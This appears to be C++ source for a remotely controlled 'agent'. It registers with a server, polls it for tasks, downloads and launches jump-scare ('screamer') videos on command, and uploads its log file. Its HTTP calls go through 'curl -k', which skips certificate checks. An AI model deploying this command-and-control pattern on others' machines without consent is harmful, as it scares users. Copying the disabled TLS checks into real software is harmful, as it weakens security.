#include "agent.h"

#include "agent_video_utils.h"
#include "local_control_server.h"
#include "screamer_open.h"
#include "video_loader.h"

#include <json.hpp>

#include <algorithm>
#include <chrono>
#include <cstdio>
#include <cstdlib>
#include <fstream>
#include <iostream>
#include <stdexcept>
#include <thread>

using json = nlohmann::json;
using std::string;
using std::cout;

namespace {
const char* kLastSelectedVideoFile = ".last_selected_video";

FILE* platform_popen(const char* command, const char* mode) {
#ifdef _WIN32
    return _popen(command, mode);
#else
    return popen(command, mode);
#endif
}

int platform_pclose(FILE* pipe) {
#ifdef _WIN32
    return _pclose(pipe);
#else
    return pclose(pipe);
#endif
}

std::string shell_escape_single_quotes(const std::string& value) {
    std::string escaped;
    escaped.reserve(value.size() + 2);
    escaped.push_back('\'');
    for (char ch : value) {
        if (ch == '\'') {
            escaped += "'\\''";
        } else {
            escaped.push_back(ch);
        }
    }
    escaped.push_back('\'');
    return escaped;
}

bool save_last_selected_video(const std::string& video_name) {
    const std::string normalized = agent_video_utils::extract_video_name_token(video_name);
    if (normalized.empty()) {
        return false;
    }

    std::ofstream cache_file(kLastSelectedVideoFile, std::ios::trunc);
    if (!cache_file.is_open()) {
        return false;
    }

    cache_file << normalized;
    return true;
}

bool load_last_selected_video(std::string& out_video_name) {
    std::ifstream cache_file(kLastSelectedVideoFile);
    if (!cache_file.is_open()) {
        return false;
    }

    std::string cached_value;
    std::getline(cache_file, cached_value);
    const std::string normalized = agent_video_utils::extract_video_name_token(cached_value);
    if (normalized.empty()) {
        return false;
    }

    out_video_name = normalized;
    return true;
}
} // namespace

void Agent::log(const string& msg) {
    std::ofstream("agent.log", std::ios::app) << msg << std::endl;
    cout << msg << std::endl;
}

std::string Agent::http_post(const string& url, const string& data) {
    const std::string cmd =
        "curl -s -k -X POST -H 'Content-Type: application/json' --data-binary " +
        shell_escape_single_quotes(data) + " " +
        shell_escape_single_quotes(url);

    string result;
    FILE* pipe = platform_popen(cmd.c_str(), "r");
    if (!pipe) {
        return result;
    }

    char buf[256];
    while (fgets(buf, sizeof(buf), pipe)) {
        result += buf;
    }
    platform_pclose(pipe);
    return result;
}

bool Agent::set_selected_video(const std::string& raw_value, const std::string& source) {
    std::string normalized;
    if (!agent_video_utils::normalize_video_name_for_control(raw_value, normalized)) {
        log("Rejected selected video from " + source + ": " + raw_value);
        return false;
    }

    {
        std::lock_guard<std::mutex> lock(selected_video_mutex_);
        selected_video_ = normalized;
    }

    if (!save_last_selected_video(normalized)) {
        log("Warning: failed to persist selected video: " + normalized);
    }

    log("Selected video updated from " + source + ": " + normalized);
    return true;
}

std::string Agent::get_selected_video() const {
    std::lock_guard<std::mutex> lock(selected_video_mutex_);
    return selected_video_;
}

void Agent::init_local_control_server() {
    local_control_server_ = std::make_unique<LocalControlServer>(
        local_control_port_,
        [this](const std::string& value) {
            return set_selected_video(value, "frontend-api");
        },
        [this]() {
            return get_selected_video();
        },
        [this](const std::string& message) {
            log(message);
        }
    );

    if (!local_control_server_->start()) {
        log("Warning: local control server did not start");
    }
}

Agent::Agent(const string& config_file)
    : interval_(5),
      local_control_port_(8787),
      selected_video_("screamer1.mp4") {
    std::ofstream("agent.log", std::ios::trunc).close();

    std::ifstream f(config_file);
    if (!f.is_open()) {
        throw std::runtime_error("Cannot open config file: " + config_file);
    }

    json cfg = json::parse(f);
    uid_ = cfg.value("uid", "");
    descr_ = cfg.value("descr", "web-agent");
    server_uri_ = cfg.value("server_uri", "");
    interval_ = std::max(1, cfg.value("request_interval", 5));
    local_control_port_ = std::max(1, cfg.value("local_control_port", 8787));

    if (uid_.empty() || server_uri_.empty()) {
        throw std::runtime_error("Config must contain non-empty uid and server_uri");
    }

    std::string cached_video;
    if (load_last_selected_video(cached_video)) {
        selected_video_ = cached_video;
    }

    log("Agent started, UID: " + uid_);
    log("Initial selected video: " + selected_video_);

    std::ifstream code_file(".access_code_" + uid_);
    if (code_file.is_open()) {
        std::getline(code_file, access_code_);
        log("Loaded saved access code: " + access_code_);
    } else {
        log("Registering...");
        json req = {{"UID", uid_}, {"descr", descr_}};
        string resp = http_post(server_uri_ + "wa_reg/", req.dump());
        log("Response: " + resp);

        try {
            const auto resp_json = json::parse(resp);
            if (resp_json.contains("access_code")) {
                access_code_ = resp_json["access_code"].get<std::string>();
                log("Access code: " + access_code_);
                std::ofstream(".access_code_" + uid_) << access_code_;
                log("Access code saved");
            }
        } catch (...) {
            log("Failed to parse registration response");
        }
    }

    init_local_control_server();
}

Agent::~Agent() {
    if (local_control_server_) {
        local_control_server_->stop();
    }
}

void Agent::run() {
    int idle_polls = 0;
    int poll_counter = 0;

    while (true) {
        ++idle_polls;
        ++poll_counter;
        log("Poll #" + std::to_string(poll_counter));

        json req = {{"UID", uid_}, {"descr", descr_}, {"access_code", access_code_}};
        string resp = http_post(server_uri_ + "wa_task/", req.dump());
        log("Response: " + resp);

        try {
            auto task = json::parse(resp);
            const int code = std::stoi(task["code_responce"].get<string>());

            if (code == 1) {
                idle_polls = 0;
                const std::string task_code = task.value("task_code", "");
                log("TASK: " + task_code);
                log("Session: " + task.value("session_id", "-"));

                if (task_code == "TASK") {
                    std::string video_name = get_selected_video();

                    if (task.contains("options")) {
                        const json& option = task["options"];
                        if (!agent_video_utils::is_empty_task_option(option)) {
                            const std::string resolved = agent_video_utils::resolve_video_name(option);
                            set_selected_video(resolved, "task-options");
                            video_name = get_selected_video();
                            log("Video option raw: " + option.dump() + ", resolved file: " + video_name);
                        } else {
                            log("Video option is empty/null: " + option.dump() + ", using selected video: " + video_name);
                        }
                    } else {
                        log("Video option missing, using selected video: " + video_name);
                    }

                    const std::string video_url =
                        "https://github.com/testerVsego/vid_for_agent/blob/main/" + video_name;

                    clear_resources();
                    if (load_vid(video_url, video_name)) {
                        zapusk_exe(video_name);
                    } else {
                        log("Failed to load video from: " + video_url);
                    }
                } else if (task_code == "CONF") {
                    log("Received CONF. Stopping agent loop.");
                    break;
                } else if (task_code == "TIMEOUT") {
                    try {
                        const std::string raw = task.value("options", "");
                        interval_ = std::max(1, std::stoi(raw));
                        log("Polling interval updated to " + std::to_string(interval_) + " seconds");
                    } catch (...) {
                        log("Invalid TIMEOUT options. Interval unchanged.");
                    }
                } else if (task_code == "FILE") {
                    std::ifstream log_file("agent.log");
                    if (log_file.is_open()) {
                        std::string file_content(
                            (std::istreambuf_iterator<char>(log_file)),
                            std::istreambuf_iterator<char>()
                        );

                        json upload_req = {
                            {"UID", uid_},
                            {"access_code", access_code_},
                            {"file_name", "agent.log"},
                            {"file_data", file_content}
                        };

                        const string upload_resp = http_post(server_uri_ + "wa_upload/", upload_req.dump());
                        log("Upload response: " + upload_resp);
                    } else {
                        log("Error: Could not open agent.log for reading");
                    }
                } else {
                    log("Unknown task code: " + task_code);
                }
            } else if (code == 0) {
                log("No tasks");
            } else {
                log("Error: " + std::to_string(code));
                if (task.contains("msg")) {
                    log("Msg: " + task["msg"].get<string>());
                }
            }
        } catch (...) {
            log("Failed to parse task response");
        }

        std::this_thread::sleep_for(std::chrono::seconds(interval_));
        if (idle_polls >= 1000000000) {
            log("There have been no tasks for a long time, work is ending");
            break;
        }
    }
}
